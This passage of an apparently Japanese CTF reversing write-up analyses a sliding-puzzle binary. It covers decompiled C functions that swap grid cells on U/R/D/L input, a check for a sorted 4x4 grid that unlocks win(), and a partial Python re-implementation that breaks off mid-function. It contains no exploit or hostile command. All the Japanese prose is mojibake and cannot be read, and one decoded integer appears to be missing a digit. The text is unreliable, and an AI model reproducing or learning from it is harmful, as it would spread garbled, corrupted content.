  <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>win</code>é–¢æ•°ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚ŒãŒå®Ÿè¡Œã§ãã‚Œã°ã€flagã‚’è¦‹ã›ã¦ã‚‚ã‚‰ãˆã‚‹ã‚ˆã†ã§ã™ã€‚
pwnå•ã§ã¯ãªã„ã®ã§ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã©ã†ãªã£ã¦ã„ã‚‹ã‹è§£æã‚’é€²ã‚ã¦ã„ã‘ã°è§£ã‘ã‚‹ã ã‚ã†ã¨è€ƒãˆã€
ä¸€æ–‡å­—é–¢æ•°ã®<code>e</code>ã‚„<code>q</code>é–¢æ•°ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>e</span><span class=p>(</span><span class=kt>char</span> <span class=n>param_1</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>int</span> <span class=n>local_10</span><span class=p>;</span>
  <span class=kt>int</span> <span class=n>local_c</span><span class=p>;</span>
  
  <span class=n>s</span><span class=p>(</span><span class=o>&amp;</span><span class=n>local_c</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_10</span><span class=p>);</span>
  <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;U&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
        <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_c</span> <span class=o>+</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>&lt;</span> <span class=sc>&#39;V&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;R&#39;</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
          <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>&lt;</span> <span class=sc>&#39;S&#39;</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;D&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
          <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
            <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_c</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
        <span class=p>}</span>
      <span class=p>}</span>
      <span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=n>param_1</span> <span class=o>==</span> <span class=sc>&#39;L&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
        <span class=n>f</span><span class=p>((</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>),</span>
          <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_10</span> <span class=o>+</span> <span class=o>-</span><span class=mi>1</span><span class=p>))</span> <span class=o>*</span> <span class=mi>4</span><span class=p>));</span>
      <span class=p>}</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>æ¨™æº–å…¥åŠ›ã‹ã‚‰å…¥åŠ›ã•ã‚ŒãŸæ–‡å­—åˆ—ã®å…ˆé ­1æ–‡å­—ãŒå¼•æ•°ã«å…¥åŠ›ã•ã‚Œã¾ã™ã€‚
å…¥åŠ›ã®æ–‡å­—ã«æ„å‘³ã‚’æŒã¤ã®ã¯Uã€Rã€Dã€Lã®ã¿ã®ã‚ˆã†ã§ã™ã€‚ãã—ã¦ã€local_10ã€local_cã®æ¡ä»¶ãŒã‚ã‚Šã¾ã™ãŒã€åŸºæœ¬çš„ã«ã¯ã“ã‚Œã‚‰ã©ã‚Œã‹ã®æ–‡å­—ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€<code>f</code>é–¢æ•°ãŒå‘¼ã°ã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚
<code>f</code>é–¢æ•°ã«å…¥åŠ›ã•ã‚Œã¦ã„ã‚‹<code>M</code>ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚‚4ã®å€æ•°ã§ã‚ã‚‹ã“ã¨ã‚‚æ°—ã«ãªã‚Šã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=nf>f</span><span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=n>param_1</span><span class=p>,</span><span class=n>uint</span> <span class=o>*</span><span class=n>param_2</span><span class=p>)</span>

<span class=p>{</span>
  <span class=o>*</span><span class=n>param_1</span> <span class=o>=</span> <span class=o>*</span><span class=n>param_1</span> <span class=o>^</span> <span class=o>*</span><span class=n>param_2</span><span class=p>;</span> 
  <span class=o>*</span><span class=n>param_2</span> <span class=o>=</span> <span class=o>*</span><span class=n>param_2</span> <span class=o>^</span> <span class=o>*</span><span class=n>param_1</span><span class=p>;</span> <span class=c1>// param_2 = param_2 ^ (param_1 ^ param_2) = param_1
</span><span class=c1></span>  <span class=o>*</span><span class=n>param_1</span> <span class=o>=</span> <span class=o>*</span><span class=n>param_1</span> <span class=o>^</span> <span class=o>*</span><span class=n>param_2</span><span class=p>;</span> <span class=c1>// param_1 = (param_1 ^ param_2) ^ param_1 = param_2
</span><span class=c1></span>  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>f</code>é–¢æ•°ã¯å¼•æ•°ã®å€¤ã©ãŠã—ã§xorã—ã¦ã„ã¾ã™ã€‚è¨ˆç®—ã‚’è¿½ã†ã¨ã€ã“ã‚Œã¯å¼•æ•°ã§ã‚ã‚‹<code>param_1</code>ã¨<code>param_2</code>ã®å€¤ã‚’äº¤æ›ã™ã‚‹å‡¦ç†ã§ã‚ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚
<code>q</code>é–¢æ•°ã‚‚è¦‹ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>undefined8</span> <span class=nf>q</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>int</span> <span class=n>local_10</span><span class=p>;</span>
  <span class=kt>int</span> <span class=n>local_c</span><span class=p>;</span>
  
  <span class=n>local_c</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
  <span class=k>do</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=mi>2</span> <span class=o>&lt;</span> <span class=n>local_c</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=k>for</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_10</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>;</span> <span class=n>local_10</span> <span class=o>=</span> <span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&lt;=</span>
          <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)(</span><span class=n>local_c</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&lt;=</span>
          <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>M</span> <span class=o>+</span> <span class=p>((</span><span class=kt>long</span><span class=p>)</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=n>local_c</span> <span class=o>=</span> <span class=n>local_c</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
  <span class=p>}</span> <span class=k>while</span><span class=p>(</span> <span class=nb>true</span> <span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>M</code>ã®çŠ¶æ…‹ã‹ã‚‰æ¯”è¼ƒã‚’è¡Œã„ã€ã™ã¹ã¦ã®æ¯”è¼ƒã‚’é€šã‚‰ãªã‹ã£ãŸã‚‰0ã‚’è¿”ã—ã¦ãã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚
<code>main</code>é–¢æ•°ã§ã‚‚ã‚ã‹ã‚‹é€šã‚Šã€<code>q</code>é–¢æ•°ã‹ã‚‰0ã‚’è¿”ã—ã¦ã‚‚ã‚‰ãˆã‚Œã°<code>win</code>é–¢æ•°ã‚’å®Ÿè¡Œã—ã¦ãã‚Œã¾ã™ã€‚
ä»¥ä¸Šã‹ã‚‰U, R, D, Lã‚’<code>></code>ã®ã‚ã¨ã«å…¥åŠ›ã—ã¦ã„ãã“ã¨ã§<code>M</code>ã«ã‚ã‚‹å€¤ã®äº¤æ›ã‚’è¡Œã„ãªãŒã‚‰<code>q</code>é–¢æ•°ã§0ã‚’è¿”ã—ã¦ãã‚Œã‚‹ã‚ˆã†ãª<code>M</code>ã®çŠ¶æ…‹ã‚’ä½œã‚Šå‡ºã™ã“ã¨ãŒã“ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®æ„å›³ã§ã‚ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚
4ã®å€æ•°ã¨ãªã£ã¦ã„ã‚‹ç†ç”±ã¯<code>M</code>ã«ã¤ã„ã¦ä¸€ã¤ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’æ±ºã‚ãŸã¨ãã€intå‹ã¨ã—ã¦è§£é‡ˆã™ã‚‹ãŸã‚ã§ã™ã€‚intå‹ã®ã‚µã‚¤ã‚ºã¯4ãƒã‚¤ãƒˆã§ã™ã€‚<code>M</code>ã¯æ¬¡ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>\xdb\x56\x58\x44\x04\x03\x23\x4c\x9f\x44\x22\x00\xb7\x96\x1a\x67\xf7\x44\x56\x6c\x87\x62\xf4\x7f\x29\xc8\xe9\x6e\x72\x2e\xda\x5c\x00\x00\x00\x00\xc9\x88\x8e\x69\x4f\x5a\xe6\x33\x54\x5c\xcc\x50\x1a\x83\x49\x13\x74\x8f\xc8\x53\xb9\x8a\x85\x25\xd8\x76\xf9\x72
</code></pre></td></tr></table>
</div>
</div><p>ã“ã‚Œã‚’4ãƒã‚¤ãƒˆã”ã¨å–ã‚Šå‡ºã—ãã‚Œãã‚Œã‚’intå‹ã§è§£é‡ˆã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>\xdb\x56\x58\x44 = 1146640091
\x04\x03\x23\x4c = 1277362948
\x9f\x44\x22\x00 = 0002245791
\xb7\x96\x1a\x67 = 1729795767 
\xf7\x44\x56\x6c = 1817593079
\x87\x62\xf4\x7f = 2146722439
\x29\xc8\xe9\x6e = 186081488
\x72\x2e\xda\x5c = 1557802610
\x00\x00\x00\x00 = 0000000000
\xc9\x88\x8e\x69 = 1770948809
\x4f\x5a\xe6\x33 = 0870734415
\x54\x5c\xcc\x50 = 1355570260
\x1a\x83\x49\x13 = 0323584794
\x74\x8f\xc8\x53 = 1405652852
\xb9\x8a\x85\x25 = 0629508793
\xd8\x76\xf9\x72 = 1928951512
</code></pre></td></tr></table>
</div>
</div><p><code>M</code>ã‚’å‘¼ã³å‡ºã™ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚„<code>M</code>ãŒã©ã®ã‚ˆã†ã«å‹•ã„ã¦ã„ã‚‹ã®ã‹ç¢ºèªã—ãŸã„ã®ã§ã€ä»Šå›ã¯pythonã§ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’å†å®Ÿè£…ã—å‹•ã‹ã—ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>M_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xdb\x56\x58\x44\x04\x03\x23\x4c\x9f\x44\x22\x00\xb7\x96\x1a\x67\xf7\x44\x56\x6c\x87\x62\xf4\x7f\x29\xc8\xe9\x6e\x72\x2e\xda\x5c\x00\x00\x00\x00\xc9\x88\x8e\x69\x4f\x5a\xe6\x33\x54\x5c\xcc\x50\x1a\x83\x49\x13\x74\x8f\xc8\x53\xb9\x8a\x85\x25\xd8\x76\xf9\x72</span><span class=s1>&#39;</span>

<span class=n>M</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>*</span><span class=mi>4</span><span class=p>)]</span>
<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>*</span><span class=mi>4</span><span class=p>):</span>
    <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
        <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>M_bytes</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>4</span><span class=p>],</span> <span class=s2>&#34;little&#34;</span><span class=p>)</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>

<span class=k>def</span> <span class=nf>s</span><span class=p>():</span>
    <span class=n>p1</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=n>p2</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>local_c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>for</span> <span class=n>local_10</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
            <span class=k>if</span> <span class=n>M</span><span class=p>[(</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
                <span class=n>p1</span> <span class=o>=</span> <span class=n>local_c</span>
                <span class=n>p2</span> <span class=o>=</span> <span class=n>local_10</span>
    <span class=k>return</span> <span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>s_index</span><span class=p>():</span>
    <span class=k>for</span> <span class=n>local_c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>for</span> <span class=n>local_10</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>] </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>local_c</span><span class=p>,</span> <span class=n>local_10</span><span class=p>,</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span>

<span class=k>def</span> <span class=nf>e</span><span class=p>(</span><span class=n>p1</span><span class=p>):</span>
    <span class=n>s1</span><span class=p>,</span> <span class=n>s2</span> <span class=o>=</span> <span class=n>s</span><span class=p>()</span> <span class=c1># s1, s2 is (0~3)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>]&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>s2</span><span class=p>,</span> <span class=n>p1</span><span class=p>))</span>
    <span class=k>if</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;U&#34;</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>s1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;U: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>
    <span class=k>elif</span> <span class=n>p1</span> <span class=o>&lt;</span> <span class=s2>&#34;V&#34;</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;R&#34;</span><span class=p>:</span>
            <span class=k>if</span> <span class=n>s2</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;R: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
